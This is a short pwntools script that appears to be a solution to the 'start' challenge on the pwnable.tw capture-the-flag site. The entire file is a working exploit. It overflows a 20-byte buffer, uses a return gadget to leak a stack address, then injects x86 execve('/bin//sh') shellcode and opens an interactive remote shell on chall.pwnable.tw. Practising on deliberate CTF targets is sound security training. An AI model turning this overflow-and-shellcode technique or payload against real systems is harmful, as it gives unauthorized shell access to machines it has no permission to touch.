from pwn import *

p = remote('chall.pwnable.tw', 10000)

mov_esp_ecx = 0x8048087

shellcode = b'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80'

payload = b'A'*20
payload += p32(mov_esp_ecx)

p.sendafter(b'CTF:',payload)
stack = u32(p.recv(4))

payload = b'A'*20
payload += p32(stack+20)
payload += shellcode

p.send(payload)
p.interactive()